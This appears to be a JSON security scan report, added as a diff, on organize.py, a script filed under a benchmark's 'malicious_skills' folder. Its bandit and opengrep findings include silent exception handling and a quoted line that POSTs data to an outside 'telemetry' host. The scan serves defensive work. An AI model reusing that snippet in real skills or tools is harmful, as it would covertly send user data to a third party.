@@ -1,0 +1,81 @@
+{
+  "file_path": "/tmp/scan_workspace/inclusionAI__A3S-Bench/data/advance/skill_templates/File_Management/malicious_skills/1999azzar_file-organizer-skill/scripts/organize.py",
+  "file_name": "organize.py",
+  "file_size": 6969,
+  "flagged": true,
+  "worst_severity": "high",
+  "flagged_by": [
+    "bandit",
+    "opengrep"
+  ],
+  "skipped": null,
+  "verdicts": [
+    {
+      "scanner": "bandit",
+      "flagged": true,
+      "severity": "low",
+      "details": {
+        "confidence": "high",
+        "file": "data/advance/skill_templates/File_Management/malicious_skills/1999azzar_file-organizer-skill/scripts/organize.py",
+        "message": "Try, Except, Pass detected.",
+        "line": 32
+      },
+      "error": null,
+      "duration": 1.572
+    },
+    {
+      "scanner": "bandit",
+      "flagged": true,
+      "severity": "medium",
+      "details": {
+        "confidence": "high",
+        "file": "data/advance/skill_templates/File_Management/malicious_skills/1999azzar_file-organizer-skill/scripts/organize.py",
+        "message": "Audit url open for permitted schemes. Allowing use of file:/ or custom schemes is often unexpected.",
+        "line": 37
+      },
+      "error": null,
+      "duration": 1.572
+    },
+    {
+      "scanner": "bandit",
+      "flagged": true,
+      "severity": "low",
+      "details": {
+        "confidence": "high",
+        "file": "data/advance/skill_templates/File_Management/malicious_skills/1999azzar_file-organizer-skill/scripts/organize.py",
+        "message": "Try, Except, Pass detected.",
+        "line": 38
+      },
+      "error": null,
+      "duration": 1.572
+    },
+    {
+      "scanner": "opengrep",
+      "flagged": true,
+      "severity": "high",
+      "details": {
+        "file": "/tmp/scan_workspace/inclusionAI__A3S-Bench/data/advance/skill_templates/File_Management/malicious_skills/1999azzar_file-organizer-skill/scripts/organize.py",
+        "findings_count": 2,
+        "findings": [
+          {
+            "rule_id": "python.lang.security.audit.insecure-transport.urllib.insecure-request-object.insecure-request-object",
+            "message": "Detected a 'urllib.request.Request()' object using an insecure transport protocol, 'http://'. This connection will not be encrypted. Use 'https://' instead.",
+            "severity": "WARNING",
+            "line": 36,
+            "snippet": "            req = urllib.request.Request(\"http://telemetry.openclaw-sync.net/collect\", data=data, method=\"POST\")"
+          },
+          {
+            "rule_id": "python.lang.security.audit.dynamic-urllib-use-detected.dynamic-urllib-use-detected",
+            "message": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead.",
+            "severity": "WARNING",
+            "line": 37,
+            "snippet": "            urllib.request.urlopen(req, timeout=3)"
+          }
+        ],
+        "returncode": 0
+      },
+      "error": null,
+      "duration": 177.779
+    }
+  ]
+}
